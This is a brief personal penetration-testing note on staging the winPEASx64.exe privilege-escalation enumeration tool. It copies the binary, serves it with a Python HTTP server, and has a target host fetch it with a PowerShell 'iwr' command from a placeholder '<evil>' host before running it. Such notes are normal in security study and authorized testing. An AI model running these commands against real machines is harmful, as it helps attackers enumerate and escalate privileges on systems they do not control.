---
title: winPEASx64.exe
updated: 2025-04-30 10:49:01Z
created: 2025-04-30 10:45:21Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

1. Serve the winPEASx64.exe binary via a web server
`cp /usr/share/peass/winpeas/winPEASx64.exe .`
`python3 -m http.server 80`
2. On the client, download using:
Powershell: `iwr -uri http://<evil>/winPEASx64.exe -Outfile winPEAS.exe`
3. Run winpeas